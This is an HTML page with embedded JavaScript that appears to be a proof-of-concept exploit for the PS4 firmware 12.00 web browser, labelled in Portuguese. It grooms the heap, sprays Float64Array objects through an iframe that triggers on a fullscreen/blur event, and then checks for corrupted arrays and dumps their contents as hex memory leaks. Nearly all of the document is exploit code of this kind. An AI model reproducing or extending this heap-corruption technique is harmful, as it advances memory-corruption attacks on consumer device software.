<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Heap Grooming - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Heap Grooming</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>

    <button onclick="groomHeap()" style="padding: 12px; background-color: #ffeb3b;">0. Sujar RAM (Grooming)</button>
    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Iframe (Fast Spray)</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar (Dump 0-127)</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px; max-height: 400px; overflow-y: scroll;"></div>
    <div id="grooming-area" style="display:none;"></div>
    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        // PASSO 0: Cria milhares de elementos pequenos para fragmentar a memória
        function groomHeap() {
            const area = document.getElementById('grooming-area');
            for(let i = 0; i < 2000; i++) {
                let d = document.createElement('div');
                d.title = "Grooming" + i;
                area.appendChild(d);
            }
            statusPai.innerText = "RAM Fragmentada. Siga para o Passo 1.";
            statusPai.style.color = "orange";
        }

        function prepareObjects() {
            controllers = [];
            for(let i = 0; i < 5000; i++) {
                // Aumentamos para 128 offsets (1KB por objeto)
                let arr = new Float64Array(128); 
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos (1KB) prontos.";
            statusPai.style.color = "blue";
        }

        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:100px; border:1px solid red;"></iframe>';
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html><body><button onclick="st()">START FS + OPTIONS</button>
                <script>
                    function st() {
                        document.documentElement.webkitRequestFullscreen();
                        window.onblur = function() {
                            let s = [];
                            for(let i = 0; i < 10000; i++) {
                                let p = new Float64Array(128).fill(${PATTERN});
                                s.push(p);
                            }
                            document.open(); document.write('<h1>OK</h1>'); document.close();
                        };
                    }
                <\/script></body></html>
            `);
            fDoc.close();
        }

        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: ID: " + corruptedIndex + "</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ DEEP DUMP 0-127 ]</b><br>";

                for(let i = 0; i < 128; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
                    let style = isInteresting ? "color:#fff; background:#a00;" : "";
                    
                    let br = (i % 4 === 3) ? "<br>" : "";
                    leakOutput.innerHTML += "O[" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA.</span>";
            }
        }
    </script>
</body>
</html>
